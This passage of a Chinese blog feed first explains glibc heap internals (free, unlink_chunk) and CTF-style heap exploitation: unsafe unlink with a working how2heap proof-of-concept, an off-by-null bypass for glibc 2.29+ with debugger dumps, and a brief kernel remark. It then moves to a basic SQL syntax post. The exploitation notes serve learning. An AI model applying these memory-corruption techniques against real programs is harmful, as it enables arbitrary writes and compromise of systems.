class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">  <span class="built_in">unlink_chunk</span>(av, nextchunk);    <span class="comment">// 当前的 arena 和 next_chunk 使用指针连接</span></span><br><span class="line">  size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">  <span class="built_in">clear_inuse_bit_at_offset</span>(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>unlink函数主要是指针的处理，假设3个chunk，a-b-c，a-b在unsortedbin 范围，c主要防止top_chunk合并，正常情况下</p>
<ul>
<li>首先，unsorted bin 按照free时间顺序连接，fd指向时间靠前的chunk。</li>
<li>向前合并：free b, free a。先成为 arena&lt;-&gt;b 双链表，然后在调用 unlink(av, b)。</li>
<li>向后合并：free a, free b。先成为 arena&lt;-&gt;a 双链表 在int_free 调用的是 unlink(av, a)。</li>
<li>这里就使用向后合并举例：fd&#x3D;a-&gt;fd&#x3D;arena, bk&#x3D;a-&gt;bk&#x3D;arena；在经历一个赋值语句变为 arena-&gt;bk&#x3D;arena，areba-&gt;fd&#x3D;arena。从arena&lt;-&gt;a 变成了 arena 完成unlink此操作。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">unlink_chunk</span><span class="params">(mstate av, mchunkptr p)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chunksize</span>(p) != <span class="built_in">prev_size</span>(<span class="built_in">next_chunk</span>(p)))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(<span class="built_in">chunksize_nomask</span>(p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">      <span class="built_in">malloc_printerr</span>(<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">        fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">        fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">        p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">        p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后后续继续进入free函数里操作</p>
<ul>
<li>后续操作：此时p指向a，找到arena的bins数组，然后链入arena，设置head和foot</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="comment">// 设置size罢了</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="comment">// 设置下一个chunk的prev_size</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span></span><br><span class="line"></span><br><span class="line">bck = <span class="built_in">unsorted_chunks</span>(av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">  <span class="built_in">malloc_printerr</span>(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">p-&gt;fd = fwd;</span><br><span class="line">p-&gt;bk = bck;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">in_smallbin_range</span>(size)) &#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">bck-&gt;fd = p;</span><br><span class="line">fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set_head</span>(p, size | PREV_INUSE);</span><br><span class="line"><span class="built_in">set_foot</span>(p, size);</span><br><span class="line"></span><br><span class="line"><span class="built_in">check_free_chunk</span>(av, p);</span><br></pre></td></tr></table></figure>

<p>最后：arena的bins数组存放数据：</p>
<ul>
<li>这样涉及就好像有fd，bk指针。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">bins[<span class="number">1</span>] = bins[<span class="number">0</span>] = &amp;bins - <span class="number">0x10</span></span><br></pre></td></tr></table></figure>

<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>相关的攻击手段。</p>
<h3 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h3><p>早期发现此漏洞时，没有 <code>fd-&gt;bk != p || bk-&gt;fd != p</code> 这个条件，因此直接修改 fd, bk 来进行任意地址写</p>
<ul>
<li>任意地址写，如果开了 got 表保护，可以写 hook。</li>
</ul>
<h3 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h3><p>在没有 PIE 和 got表可以写时，可以通过修改got表。其本质是一个heap overflow这是比较简单的。</p>
<ul>
<li>主要是利用 unlink 中的代码，其中指针赋值简化为 <code>p-&gt;fd-&gt;bk = p-&gt;bk, p-&gt;bk-&gt;fd = p-&gt;fd</code></li>
<li>我们控制这个 p 的内容。</li>
</ul>
<ol>
<li>按照时间 malloc A,B</li>
<li>A 堆溢出，修改A的内容 修改B的header</li>
</ol>
<ul>
<li>target &#x3D; &amp;p，需要我们可以写。或者 target就是p</li>
<li>我们在 A 里伪造一个 fake free chunk: prev_inuse, size, <em>fd&#x3D;&amp;target-0x18, bk&#x3D;&amp;target&#x3D;0x10</em></li>
<li>利用堆溢出修改 B 的header，让fake free chunk 和 B 可以合并。</li>
</ul>
<ol start="3">
<li>free B 就会 unlink，<strong>p 就是 fake free chunk</strong>，触发unlink。</li>
</ol>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">+---------+                     +----------+ </span><br><span class="line">|         |                     |          |</span><br><span class="line">|    A    |                     +----------+                    </span><br><span class="line">|         |                     |          |  A中伪造 =&gt; fake heap head(sz, fd, bk) + data </span><br><span class="line">|         |                     |fake heap |</span><br><span class="line">|         |                     |          |</span><br><span class="line">+---------+  ==heap overflow===&gt;+----------+   ===========================&gt; free B =&gt; unlink</span><br><span class="line">|         |                     |ps     sz |</span><br><span class="line">|         |                     |          |  B head =&gt; prev size 过检查</span><br><span class="line">|   B     |                     |          |            prev_inuse 为0</span><br><span class="line">|         |                     |          |</span><br><span class="line">+---------+                     +----------+</span><br></pre></td></tr></table></figure>


<p>how2heap 案例</p>
<ul>
<li>编译时指定no-pie</li>
<li>测试在ubuntu 22.04，可以通过assert.</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> malloc_size = <span class="number">0x420</span>;</span><br><span class="line">  <span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  chunk0_ptr = (<span class="type">uint64_t</span> *)<span class="built_in">malloc</span>(malloc_size);            <span class="comment">// chunk0</span></span><br><span class="line">  <span class="type">uint64_t</span> *chunk1_ptr = (<span class="type">uint64_t</span> *)<span class="built_in">malloc</span>(malloc_size);  <span class="comment">// chunk1</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr,</span><br><span class="line">         chunk0_ptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake_head</span></span><br><span class="line">  chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake fd &amp;&amp; fake bk</span></span><br><span class="line">  chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>)&amp;chunk0_ptr - (<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">3</span>);</span><br><span class="line">  chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>)&amp;chunk0_ptr - (<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>, (<span class="type">void</span> *)chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// chunk1 的 header 指针</span></span><br><span class="line">  <span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">  <span class="comment">// chunk1 -&gt; prev_size</span></span><br><span class="line">  chunk1_hdr[<span class="number">0</span>] = malloc_size;   </span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been &quot;</span></span><br><span class="line">      <span class="string">&quot;0x430, however this is its new value: %p\n&quot;</span>,</span><br><span class="line">      (<span class="type">void</span> *)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prev_inuse 为 0</span></span><br><span class="line">  chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// unlink 发生</span></span><br><span class="line">  <span class="comment">// chunk0_ptr-&gt;fd = &amp;chunk0_ptr-0x18</span></span><br><span class="line">  <span class="comment">// 修改chunk0_ptr 可以修改 *(chunk0_ptr - 0x18 )的值</span></span><br><span class="line">  <span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(victim_string, <span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">  chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>)victim_string;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>, victim_string);</span><br><span class="line">  chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>, victim_string);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  <span class="built_in">assert</span>(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比较绕，但是可以直接看最后的结果，<code>chunk0_ptr-&gt;bk-&gt;fd = chunk0_ptr-&gt;fd</code>。target 的内容存放着 <code>&amp;target-0x10</code> target的地址减去0x18</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># chunk0_ptr 堆地址</span></span><br><span class="line">pwndbg&gt; x/8xg 0x405290  </span><br><span class="line">0x405290:       0x0000000000000000      0x0000000000000431</span><br><span class="line">0x4052a0:       0x0000000000000000      0x0000000000020d61</span><br><span class="line">0x4052b0:       0x0000000000404050      0x0000000000404058    <span class="comment"># fake_fd fake_bk</span></span><br><span class="line">0x4052c0:       0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp;chunk0_ptr</span></span><br><span class="line"><span class="comment"># (&amp;chunk0_ptr - 0x10) -&gt; fd = fake_fd</span></span><br><span class="line">pwndbg&gt; x/8xg 0x0000000000404058+0x10   </span><br><span class="line">0x404068 &lt;chunk0_ptr&gt;:  0x0000000000404050      0x0000000000000000</span><br><span class="line">0x404078:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x404088:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x404098:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>结论：target 指针指向 &amp;target-0x18。我见过的问题一般利用在全局指针数组中，通过这种方式修改got表内容。<br>改<code>arr[0]</code>，这样就可以修改和读取 <code>arr[0]</code> 。改成got表，读取内容，泄露地址，又可以修改就直接修改got表内容。<br><del>没有所有权的编程是这样的</del></p>
<h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h3><p>也是堆溢出的一种形式，但还是区分一下。在这里可以攻击保护全开的程序，主要利用点为堆可以合并。</p>
<p>libc2.29 以前</p>
<ul>
<li>先释放chunk A.</li>
<li>通过chunk B,利用off by one漏洞在 修改chunk C presize 值为 chunk A size +chunk B size的同时,将chunk C的prev_inuse值覆盖为0.</li>
<li>再释放chunk C。</li>
</ul>
<p>libc2.29 以后有个检查，会检查prev_chunk size是否和当前的 chunk 的 prev_size 相同，而 off by null，我们无法直接改变 chunk size，因此我们在chunk里伪造一个chunk</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">chunksize</span>(p) != prevsize))</span><br></pre></td></tr></table></figure>

<p>修改后的off by null利用手段，因为没有arena的检查，只是检查了in_use位和size相关检查</p>
<ul>
<li>三个堆 A，B，C，最好是 0x438 这种不是整数类型的，会存在一段公用的结果。c防止与top_chunk合并</li>
<li>编辑A，在A中<strong>伪造一个堆</strong>，覆盖掉B的prev_inuse 位</li>
<li>free掉B，就会向后合并。</li>
<li>但是需要绕过unlink_chunk中对fd, bk检查 <code>__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, 0)</code>。</li>
</ul>
<p>简单点的题目会给我们一个基地址，这里我们就可以直接像unlink一样修改fd,bk就行</p>
<ul>
<li>tcache leak 在libc 2.32 需要 <code>(fd&gt;&gt;12) ^ 0</code></li>
<li>unsorted bin 存在两个chunk，泄露其中一个的 fd,bk可以得到堆地址</li>
<li>largebin 的四个指针，只有一个chunk可以使用fd_nextsize 和 bk_nextsize指向自己</li>
</ul>
<p>在比较苛刻的条件下，我们不能泄露堆地址，但是可以通过布局heap fengshui 进行伪造fake chunk。假设程序存在off by null</p>
<ul>
<li>a-x-b-c-x-d-x, a,b,c,d 大小都在unsorted bin里，x是避免合并的chunk （c&gt;d&gt;a&#x3D;b）</li>
<li>free a, c, d 拿fd来说就是形成 d-&gt;c-&gt;a-&gt;arena 的链表。</li>
<li>free b 这时候b,c合并。变成了 b-&gt;d-&gt;a-&gt;arena 链表，但是这时候c的指针并没有清除。</li>
<li>unsorted bin FIFO。此处需要将 a，d放入largebin里，然后切割 b-c，生成e，e包含c的 fd, bk指针。</li>
<li>清空unsorted bin 获得f</li>
<li>编辑 e，可以改原来c位置的size，并且同时包含了fd, bk 指针。因此此处我们需要改一点完成unlink中的检查。</li>
<li>之前chunk c-&gt;fd&#x3D;a, c-&gt;bk&#x3D;d。因为其放入了largebin里 a-&gt;bk &#x3D; d， d-&gt;fd &#x3D; a，无法通过检查，因此我们需要想办法满足条件</li>
<li>将a,d从large bin 拿出来。</li>
<li>bypass bk指针：free a, free f。a-&gt;bk &#x3D; f, 将a拿出来，不会清空指针，修改一下bk指针，因为f和c距离比较近，因此我们可以通过partial write修改bk</li>
<li>bypass fd指针: 直接向bypass bk一样，bk指向的是arena。free f, free d，d-&gt;fd&#x3D;f。让后让其进入largebin里，d-&gt;fd&#x3D;f。拿回d就行<ul>
<li>这里为什么不在unsortbin里：直接拿出d，会先将f放入largebin，然后d-&gt;arena 形成链表。先拿f再拿出d, d-&gt;arena链表。都破坏了fd指针（没有指向堆。</li>
</ul>
</li>
</ul>
<p>可以使用这段代码调试，没有指针改变，主要看的是可行性。</p>
<ul>
<li>最好重新分布一下size，最简单是修改 <code>x0</code> 大小。保证f和c 只有最后一个字节不同</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">void</span> *a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">void</span> *x0 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">void</span> *c = <span class="built_in">malloc</span>(<span class="number">0x438</span>);  </span><br><span class="line">  <span class="type">void</span> *x1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">void</span> *d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">void</span> *x2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(d);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *e = <span class="built_in">malloc</span>(<span class="number">0x438</span>);   <span class="comment">// 切割 b-c</span></span><br><span class="line">  <span class="type">void</span> *f = <span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">// 清除unsorted bin</span></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);        <span class="comment">// largebin 获得 p4</span></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);        <span class="comment">// large bin 获得 p1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">free</span>(f); <span class="comment">// p1-&gt;bk = </span></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  f = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(f);</span><br><span class="line">  <span class="built_in">free</span>(d);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// large bin</span></span><br><span class="line"></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>bk bypass</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p f</span><br><span class="line"><span class="variable">$2</span> = (void *) 0x555555559b20</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8xg 0x555555559b20-0x30</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000441</span><br><span class="line">0x555555559b00: 0x0000555555559290      0x0000555555559f50</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里bk需要覆盖2byte才行，可以优化size，让其只覆盖1byte就行。</span></span><br><span class="line">pwndbg&gt; x/4xg 0x0000555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555592a0: 0x00007ffff7e19ce0      0x0000555555559b10</span><br></pre></td></tr></table></figure>

<p>fd bypass</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p f</span><br><span class="line"><span class="variable">$1</span> = (void *) 0x555555559b20</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8xg 0x555555559b20-0x30</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000441</span><br><span class="line">0x555555559b00: 0x0000555555559290      0x0000555555559f50</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里就是fd</span></span><br><span class="line">pwndbg&gt; x/8xg 0x0000555555559f50</span><br><span class="line">0x555555559f50: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x555555559f60: 0x0000555555559b10      0x00007ffff7e1a0d0</span><br><span class="line">0x555555559f70: 0x0000555555559b10      0x0000555555559b10</span><br><span class="line">0x555555559f80: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel ?"></a>kernel ?</h2><ul>
<li>kernel 存在很多的 list_head 结构体，我们可以使用 <strong>条件竞争</strong> 来修改指针，借助如同 msg_msg 结构体来进行任意地址写</li>
</ul>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://www.anquanke.com/post/id/197635">How2Heap堆利用学习笔记（三）：Unsafe_unlink</a></li>
<li><a href="https://xie-yuanhao.gitee.io/2023/06/27/Pwn-%E5%A0%86%E5%9F%BA%E7%A1%80-Unsafe%20Unlink/">PWN-堆基础之Unsafe Unlink)</a></li>
<li><a href="https://blog.wjhwjhn.com/archives/193/">glibc 2.29-2.32 off by null bypass</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>常用数据库基本语法</title>
    <url>/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>简单学习增删改查</p>
</blockquote>
<span id="more"></span>

<ul>
<li><p>三个最广泛使用的开源 RDBMS：SQLite、MySQL 和 PostgreSQL。关系型数据库</p>
</li>
<li><p>因为SQL的标准，三个数据库差不多的语法。</p>
</li>
</ul>
<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><blockquote>
<p>其实是开源 MariaDB</p>
</blockquote>
<p>数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看</span></span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 连接</span></span><br><span class="line">use database_name;</span><br></pre></td></tr></table></figure>

<p>表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">	column_name data_type 属性 </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SHOW</span> tables;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 增加</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>

<p>数据类型</p>
<p>查询限定</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 排序</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 属性限定</span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 结果个数</span></span><br><span class="line">limit</span><br></pre></td></tr></table></figure>

<h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><p>数据库</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 连接</span></span><br></pre></td></tr></table></figure>

<p>表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">	column_name data_type 属性 </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 增加</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>

<p>查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 排序</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 去重</span></span><br><span class="line"><span class="keyword">distinct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 属性限定</span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br></pre></td></tr></table></figure>

<h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><p>sqlite3</p>
<p>命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.help;     -- 帮助信息</span><br><span class="line"></span><br><span class="line">.open test.db;  -- 打开文件，如果没有就创建</span><br><span class="line"></span><br><span class="line">.show;     -- 显示一系列属性</span><br><span class="line"></span><br><span class="line">.quit   -- 退出</span><br><span class="line"></span><br><span class="line">.databases  -- 显示数据库</span><br></pre></td></tr></table></figure>

<p>创建数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 读取或者创建</span><br><span class="line">sqlite3 name</span><br><span class="line">.open name</span><br></pre></td></tr></table></figure>

<p>导入导出数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.dump   -- 将数据库导出SQL 文件 </span><br><span class="line">sqlite3 test.db .dump &gt; test.sql</span><br><span class="line">sqlite3 test.db &lt; test.db</span><br></pre></td></tr></table></figure>

<p>创建表</p>
